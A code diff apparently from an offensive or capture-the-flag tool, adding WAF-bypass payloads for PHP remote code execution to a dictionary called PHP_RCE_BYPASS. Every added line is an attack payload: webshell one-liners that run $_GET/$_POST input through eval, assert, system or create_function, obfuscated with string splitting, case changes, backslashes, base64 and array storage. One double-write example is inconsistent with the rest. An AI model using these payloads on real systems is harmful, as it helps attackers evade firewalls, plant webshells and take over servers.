@@ -118,6 +118,54 @@ PHP_RCE_BYPASS: Dict[str, List[str]] = {
         "array_map('system',['id'])",
         "array_walk(['id'],'system')",
     ],
+    "WAF绕过-双写": [
+        "eval → evaleval", "assert → asserassertt",
+        "system → syssystemtem", "exec → exexecec",
+        "@ini_set → @ini@ini_setset",
+    ],
+    "WAF绕过-大小写": [
+        "Eval / eVaL / EvAl", "System / SYSTEM / syStem",
+        "PhpInfo / phpinfo",
+    ],
+    "WAF绕过-函数替换": [
+        "eval → assert", "eval → preg_replace('/.*/e',...)",
+        "system → shell_exec / passthru / exec",
+        "反引号命令: `id`",
+    ],
+    "WAF绕过-可变函数": [
+        "$_GET['a']($_GET['b']);", "$_POST['f']($_POST['p']);",
+        "$func = $_REQUEST['c']; $func();",
+    ],
+    "WAF绕过-字符串拼接": [
+        "$a='sy'.'stem'; $a('id');",
+        "$b='ev'.'al'; $b($_POST[1]);",
+    ],
+    "WAF绕过-编码执行": [
+        "base64_decode('ZXZhbCgkX1BPU1RbMV0p');",
+        "gzinflate(base64_decode('压缩数据'));",
+        "str_rot13('riny') → eval",
+    ],
+    "WAF绕过-反斜杠分割": [
+        "\\s\\y\\s\\t\\e\\m('id');",
+        "\\e\\v\\a\\l(\\$_POST[1]);",
+        "PHP 函数名允许反斜杠",
+    ],
+    "WAF绕过-超级全局变量": [
+        "$GLOBALS['_GET']['_']($GLOBALS['_GET']['__']);",
+        "$_ = 'system'; $_('id');",
+    ],
+    "WAF绕过-create_function": [
+        "create_function('', $_GET['c']);",
+        "create_function('', 'return '.$_POST['code'].';')();",
+    ],
+    "WAF绕过-call_user_func": [
+        "call_user_func('system', 'id');",
+        "call_user_func_array('assert', [$_POST[1]]);",
+    ],
+    "WAF绕过-数组存储": [
+        "$a=['system','id']; $a[0]($a[1]);",
+        "$a=['eval',$_POST[1]]; $a[0]($a[1]);",
+    ],
     "常见 Bypass 技巧": [
         "空格: cat${IFS}/flag 或 cat<>/flag 或 {cat,/flag}",
         "斜杠: cat $(echo L2ZsYWc=|base64 -d)",
